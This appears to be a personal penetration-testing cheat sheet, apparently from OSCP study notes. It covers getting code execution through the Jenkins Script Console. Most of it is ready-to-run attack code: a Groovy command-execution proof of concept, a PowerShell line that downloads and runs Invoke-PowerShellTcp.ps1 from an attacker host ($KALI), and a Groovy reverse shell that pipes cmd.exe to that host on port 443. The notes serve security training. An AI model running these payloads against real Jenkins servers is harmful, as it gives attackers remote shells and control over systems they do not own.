OSCP Book pg 825
Operators Handbook pg 104
TCM > Video 76
Manage Jenkins > Script Console
#### POC:
```jenkins - web app
println "cmd.exe /c systeminfo".execute().text
```
#### Powershell rev shell:
Manage Jenkins > Script Console
```jenkins - web app
def command = "powershell -c iex(new-object net.webclient).downloadstring(‘http://$KALI:80/Invoke-PowerShellTcp.ps1')"
def proc = command.execute()
println(proc.in.text)
```
#### CMD rev shell:
Manage Jenkins > Script Console
```jenkins - web app
String host="$KALI";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
